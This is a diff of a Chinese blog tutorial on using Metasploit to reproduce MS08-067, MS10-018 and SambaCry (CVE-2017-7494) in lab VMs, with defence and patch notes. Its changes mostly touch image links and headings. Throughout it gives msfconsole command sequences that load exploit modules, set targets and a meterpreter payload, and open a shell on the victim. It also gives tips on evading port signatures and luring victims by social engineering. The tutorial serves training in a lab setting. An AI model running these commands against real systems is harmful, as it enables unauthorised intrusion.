+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783744671008-b3c596cb-0b58-4374-83d9-03cacae396e0.png"></p>
 <ol start="2">
 <li>加载漏洞模块，配置攻击参数</li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search MS08-067</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search MS08-067  </span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img10.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783738968916-b22dc065-735d-493b-81e3-e67750404208.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img11.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783738993704-e744e1b7-cd33-4ef0-b866-b953e4e6f148.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img12.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783739032687-96621e96-dd24-4fca-8a14-41a914c046bf.png"></p>
 <p>设置目标 IP 地址</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.23.136</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.23.136 </span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img13.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752459192-37854255-0dfa-4cd5-b22b-e790e0e2f110.png"></p>
 <ol start="3">
-<li>执行攻击，获取系统权限</li>
+<li>执行攻击，获取系统权限。</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img14.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783739099125-1a7dc7f7-3869-4ade-930f-83fe09aff2c3.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img15.png"></p>
-<h3 id="4-防御"><a href="#4-防御" class="headerlink" title="4. 防御"></a>4. 防御</h3><ul>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783739152686-cab4f927-57a7-48cc-841f-28792445b680.png"></p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
 <li>安装KB958644补丁</li>
 <li><strong>关闭445端口</strong> 或限制SMB服务对外访问。</li>
 <li>部署<strong>防火墙与入侵检测系统</strong>，过滤异常RPC&#x2F;SMB流量。</li>
 <li>定期进行漏洞扫描与系统加固，避免使用已停止支持的操作系统。</li>
 </ul>
-<h2 id="二-MS10-018-IE浏览器"><a href="#二-MS10-018-IE浏览器" class="headerlink" title="(二) MS10-018 IE浏览器"></a>(二) MS10-018 IE浏览器</h2><h3 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>MS10-018是IE浏览器上的漏洞，主要危害Internet Explorer 6和Internet Explorer 7。 </p>
+<h2 id="MS10-018-IE浏览器"><a href="#MS10-018-IE浏览器" class="headerlink" title="MS10-018 IE浏览器"></a>MS10-018 IE浏览器</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>MS10-018是IE浏览器上的漏洞，主要危害Internet Explorer 6和Internet Explorer 7。 </p>
 <p>利用方式：MSF搭建恶意网页服务，生成钓鱼URL诱导目标访问，后台监听等待上线</p>
-<h3 id="2-命令行汇总-1"><a href="#2-命令行汇总-1" class="headerlink" title="2. 命令行汇总"></a>2. 命令行汇总</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 静默启动MSF</span></span><br><span class="line">msfconsole -q</span><br><span class="line"><span class="comment"># 2. 搜索MS10-018 IE漏洞模块</span></span><br><span class="line">search ms10-018</span><br><span class="line"><span class="comment"># 3. 加载IE溢出利用模块</span></span><br><span class="line">use exploit/windows/browser/ms10_018_ie_behaviors</span><br><span class="line"><span class="comment"># 4. 查看模块配置项</span></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 5. 设置攻击机本机IP（生成钓鱼网页地址）</span></span><br><span class="line"><span class="built_in">set</span> SRVHOST xxxx</span><br><span class="line"><span class="comment"># 6. 选用正向连接载荷</span></span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/bind_tcp</span><br><span class="line"><span class="comment"># 7. 自定义受害机监听端口，规避4444默认特征</span></span><br><span class="line"><span class="built_in">set</span> LPORT xxx</span><br><span class="line"><span class="comment"># 8. 启动攻击服务</span></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 9. 查看所有被控主机会话</span></span><br><span class="line">sessions</span><br><span class="line"><span class="comment"># 10. 接入ID为1的受害机会话</span></span><br><span class="line">sessions -i 1</span><br><span class="line"><span class="comment"># 11. 调出目标系统cmd命令行</span></span><br><span class="line">shell</span><br><span class="line"><span class="comment"># 12. 切回meterpreter</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<h3 id="命令行汇总-1"><a href="#命令行汇总-1" class="headerlink" title="命令行汇总"></a>命令行汇总</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 静默启动MSF</span></span><br><span class="line">msfconsole -q</span><br><span class="line"><span class="comment"># 2. 搜索MS10-018 IE漏洞模块</span></span><br><span class="line">search ms10-018</span><br><span class="line"><span class="comment"># 3. 加载IE溢出利用模块</span></span><br><span class="line">use exploit/windows/browser/ms10_018_ie_behaviors</span><br><span class="line"><span class="comment"># 4. 查看模块配置项</span></span><br><span class="line">show options</span><br><span class="line"><span class="comment"># 5. 设置攻击机本机IP（生成钓鱼网页地址）</span></span><br><span class="line"><span class="built_in">set</span> SRVHOST xxxx</span><br><span class="line"><span class="comment"># 6. 选用正向连接载荷</span></span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/bind_tcp</span><br><span class="line"><span class="comment"># 7. 自定义受害机监听端口，规避4444默认特征</span></span><br><span class="line"><span class="built_in">set</span> LPORT xxx</span><br><span class="line"><span class="comment"># 8. 启动攻击服务</span></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 9. 查看所有被控主机会话</span></span><br><span class="line">sessions</span><br><span class="line"><span class="comment"># 10. 接入ID为1的受害机会话</span></span><br><span class="line">sessions -i 1</span><br><span class="line"><span class="comment"># 11. 调出目标系统cmd命令行</span></span><br><span class="line">shell</span><br><span class="line"><span class="comment"># 12. 切回meterpreter</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="3-攻击步骤-1"><a href="#3-攻击步骤-1" class="headerlink" title="3. 攻击步骤"></a>3. 攻击步骤</h3><p><strong>环境</strong>：WinXP IE6&#x2F;7</p>
+<h3 id="攻击步骤-1"><a href="#攻击步骤-1" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><p><strong>环境</strong>：WinXP IE6&#x2F;7</p>
 <p><strong>前提条件</strong>：已知目标机的 IP 地址 192.168.23.136</p>
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img8.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783738821379-533a83a6-a80c-4fbc-bb50-fee11eec3cc1.png"></p>
 <ol>
-<li>启动 MSF，准备攻击，执行 msfconsole 命令</li>
+<li>启动 MSF ，准备攻击，执行 msfconsole 命令</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img16.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783744682699-04252e42-4363-4588-a448-a92e77b658ae.png"></p>
 <ol start="2">
 <li>加载漏洞模块</li>
 </ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search MS10-018</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search MS10-018  </span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img17.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783744826026-88b29f39-cee3-41d8-9f73-a42a5962c141.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img18.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783744859186-f408059a-ccd7-4f23-9d63-10f584d58ae7.png"></p>
 <ol start="3">
 <li>设置 payload 正向连接 shell</li>
 </ol>
@@ -496,17 +538,20 @@
 <li>靶机会新增监听端口，容易被端口扫描发现异常</li>
 </ul>
 <ol start="4">
-<li>配置攻击参数，查看要设置哪些东西</li>
+<li>配置攻击参数，查看要设置哪些东西。</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img19.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783744915966-5ae1b79d-86c4-4a90-ae57-37d2f8135cd9.png"></p>
 <p>查看攻击机的 IP 192.168.23.131</p>
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img20.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783745027849-e28047c2-f99a-4369-8966-83cb1b031476.png"></p>
 <p>设置攻击机的 IP 地址</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> SRVHOST 192.168.23.131</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> SRVHOST 192.168.23.131 </span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img21.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783745167156-87b91da3-eed7-4abb-920c-e10c1ab20d15.png"></p>
 <p>修改 bind_tcp 载荷 LPORT，即自定义受害机监听端口</p>
 <p>作用：</p>
 <ul>
@@ -515,44 +560,52 @@
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> LPORT 9999</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img22.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783747302463-53ec1ddc-5c20-4b63-b1a1-f2ec4b99b8b5.png"></p>
 <ol start="5">
 <li>启动攻击服务</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img23.png"></p>
-<p>出现的 url 要通过社工等方法让目标机进行访问。这里我们直接让目标机访问这个 url</p>
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img24.png"></p>
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img25.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783747335312-31c10fd7-867b-4e80-961d-95a335bb5fd3.png"></p>
+<p>出现的 url 要通过社⼯等⽅法让⽬标机进⾏访问。</p>
+<p>这里我们直接让目标机访问这个 url</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783747561297-ef1e82a1-6e1d-464b-8e29-0aec25b3f22c.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783747592673-fb8a94f5-56c7-4003-922f-1341d7f83d07.png"></p>
 <p>回车</p>
 <ol start="6">
 <li>查看后台任务与对话</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img26.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783747753742-6ac22512-94cb-4c7c-933f-f353f6ee4a2b.png"></p>
 <p>进入这个会话 1（i 就是 in，1 表示会话的 id）</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img27.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783747833392-2d70f72c-fc10-4593-bc04-33c809e3bb81.png"></p>
 <p>出现 <code>meterpreter &gt;</code> 提示符，<strong>代表漏洞利用成功、已和受害机建立控制通道</strong>，可以对目标进行操作。</p>
 <ol start="7">
 <li>执行 shell 启动命令行</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img28.png"></p>
-<h3 id="4-防御-1"><a href="#4-防御-1" class="headerlink" title="4. 防御"></a>4. 防御</h3><ul>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783748060370-9e3d758b-0194-47ad-a189-6bf3c1c72cf9.png"></p>
+<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><ul>
 <li>安装KB980182补丁</li>
 <li>禁用危险ActiveX</li>
 <li>开启DEP&#x2F;ASLR内存保护。</li>
 </ul>
-<h2 id="三-CVE-2017-7494-SambaCry（Linux永恒之蓝）"><a href="#三-CVE-2017-7494-SambaCry（Linux永恒之蓝）" class="headerlink" title="(三) CVE-2017-7494 SambaCry（Linux永恒之蓝）"></a>(三) CVE-2017-7494 SambaCry（Linux永恒之蓝）</h2><h3 id="1-简介-2"><a href="#1-简介-2" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>CVE-2017-7494，也被称为 Linux 版的永恒之蓝，是一个在 Samba 服务中发现的远程代码执行漏洞。Samba 是一种在 Linux 和 Unix 系统上实现 SMB 协议的自由软件，允许这些系统与 Windows 系统进行文件共享。该漏洞影响了 Samba 版本 3.5.0 到 4.6.4、4.5.10 和 4.4.14 之间的版本。  </p>
+<h2 id="CVE-2017-7494-SambaCry（Linux永恒之蓝）"><a href="#CVE-2017-7494-SambaCry（Linux永恒之蓝）" class="headerlink" title="CVE-2017-7494 SambaCry（Linux永恒之蓝）"></a>CVE-2017-7494 SambaCry（Linux永恒之蓝）</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>CVE-2017-7494，也被称为 Linux 版的永恒之蓝，是一个在 Samba 服务中发现的远程代码执行漏洞。Samba 是一种在 Linux 和 Unix 系统上实现 SMB 协议的自由软件，允许这些系统与 Windows 系统进行文件共享。该漏洞影响了 Samba 版本 3.5.0 到 4.6.4、4.5.10 和 4.4.14 之间的版本。  </p>
 <p>漏洞的核心在于 Samba 的 <code>is_known_pipename () </code>函数中存在字符过滤问题 ，导致攻击者可以向共享目录传递恶意文件，从而被远程代码执行。  </p>
-<h3 id="2-命令行汇总-2"><a href="#2-命令行汇总-2" class="headerlink" title="2. 命令行汇总"></a>2. 命令行汇总</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 启动MSF控制台 </span></span><br><span class="line">msfconsole -q </span><br><span class="line"><span class="comment"># 2. 搜索漏洞模块 </span></span><br><span class="line">search CVE-2017-7494 </span><br><span class="line"><span class="comment"># 3. 加载漏洞利用模块 </span></span><br><span class="line">use exploit/linux/samba/is_known_pipename </span><br><span class="line"><span class="comment"># 4. 设置目标IP </span></span><br><span class="line"><span class="built_in">set</span> RHOSTS xxxx </span><br><span class="line"><span class="comment"># 5. 执行攻击 </span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="命令行汇总-2"><a href="#命令行汇总-2" class="headerlink" title="命令行汇总"></a>命令行汇总</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 启动MSF控制台 </span></span><br><span class="line">msfconsole -q </span><br><span class="line"><span class="comment"># 2. 搜索漏洞模块 </span></span><br><span class="line">search CVE-2017-7494 </span><br><span class="line"><span class="comment"># 3. 加载漏洞利用模块 </span></span><br><span class="line">use exploit/linux/samba/is_known_pipename </span><br><span class="line"><span class="comment"># 4. 设置目标IP </span></span><br><span class="line"><span class="built_in">set</span> RHOSTS xxxx </span><br><span class="line"><span class="comment"># 5. 执行攻击 </span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<h3 id="3-攻击步骤-2"><a href="#3-攻击步骤-2" class="headerlink" title="3. 攻击步骤"></a>3. 攻击步骤</h3><ul>
+<h3 id="攻击步骤-2"><a href="#攻击步骤-2" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><ul>
 <li><strong>环境搭建</strong>：Vulhub搭建Samba 3.5~4.6.4<ul>
 <li>搭建 Vulhub 靶场前提：Ubuntu 宿主机预先安装 git、docker、docker-compose；通过 git 下载 vulhub 源码包；操作时切换 root 权限，进入对应漏洞目录，执行<code>docker-compose up -d</code>后台启动漏洞容器。  </li>
 <li>部署教程：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73909316/article/details/142954056">https://blog.csdn.net/m0_73909316&#x2F;article&#x2F;details&#x2F;142954056</a></li>
@@ -570,13 +623,15 @@
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 切换root管理员权限</span></span><br><span class="line">su root</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img29.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783751335503-dbb43a59-37a3-49a5-b5b1-a2029a2cda80.png"></p>
 <p>提示符变为 <code>root@ubuntu#</code> 代表切换成功</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入 vulhub 中Samba漏洞目录（目录内要有docker-compose.yml）</span></span><br><span class="line"><span class="built_in">cd</span> /home/enjoy/vulhub-master/samba/CVE-2017-7494</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 后台启动漏洞容器</span></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img30.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783751657051-2b7df133-4aef-47c8-bbd2-87dbd06015b7.png"></p>
 <p>注：实验结束，关闭销毁靶场</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 需要在漏洞对应目录执行</span></span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
 
@@ -586,131 +641,148 @@
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img31.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783751714301-3dcd4fe0-8ae4-40da-b572-f4a0e08763c4.png"></p>
 <ol start="3">
 <li>启动 MSF</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img32.png"></p>
-<ol start="4">
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752155201-aec420ca-4183-4b4f-ae02-28261fe811fb.png"></p>
+<ol start="2">
 <li>搜索漏洞模块</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2017-7494</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img33.png"></p>
-<ol start="5">
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752184408-3896dcc1-4217-4a93-a9d7-56a25ffc1e8d.png"></p>
+<ol start="3">
 <li>加载SambaCry漏洞的攻击模块</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img34.png"></p>
-<ol start="6">
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752209025-12b8b6d2-3239-463f-bd99-e6f7b0373bb2.png"></p>
+<ol start="4">
 <li>查看当前模块需要配置的参数</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img35.png"></p>
-<ol start="7">
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752244996-cc30a2be-711d-4eed-8a3c-1a3d69c0b26b.png"></p>
+<ol start="5">
 <li>设置远程受害主机IP</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.23.135</span><br></pre></td></tr></table></figure>
 
